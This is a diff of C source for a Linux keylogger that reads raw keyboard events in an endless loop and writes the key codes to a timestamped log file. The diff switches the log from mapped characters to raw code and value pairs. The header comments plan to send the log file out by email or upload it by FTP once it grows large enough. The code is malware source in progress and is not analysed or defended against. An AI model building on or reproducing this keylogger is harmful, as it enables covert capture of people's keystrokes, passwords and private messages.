@@ -1,11 +1,10 @@
 /*
 * ADD SLEEP
 * ADD ERROR IF USER IS NOT ROOT
-* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices)
+* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
 * ONCE FILE REACHES A CERTAIN SIZE-->EMAIL
 * IF STATEMENT--->SEND LOG FILE VIA EMAIL
 * ELSE ERROR--->UPLOAD VIA FTP
-* GRAB FROM IRC????
 */
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -17,7 +16,7 @@
 #include <time.h>
 #include <fcntl.h>
 
-#include "keymap.h"
+// #include "keymap.h"
 
 int main(void) {
 	FILE *fp = NULL;
@@ -67,15 +66,15 @@ int main(void) {
 		return 1;
 	}
 
-	fprintf(evlog, "\n\n%s", ctime(&curtime));
+	fprintf(evlog, "\n\n%s-", ctime(&curtime));
 
 	while(1) {
-		// sleep(1);
+		// sleep(1); 	MUST ADD SLEEP!!!!!
 		fflush(fp);
 
 		read(fd, &ev, sizeof(struct input_event));
-		if(ev.value == 0 && ev.type == 1) {				/* only register release state */
-			fprintf(evlog, "%s", CapKeyMap[ev.code]);
+		if(ev.type == 1) {
+			fprintf(evlog, "%i,%i-", ev.code, ev.value);
 			fflush(evlog);
 		}
 	}
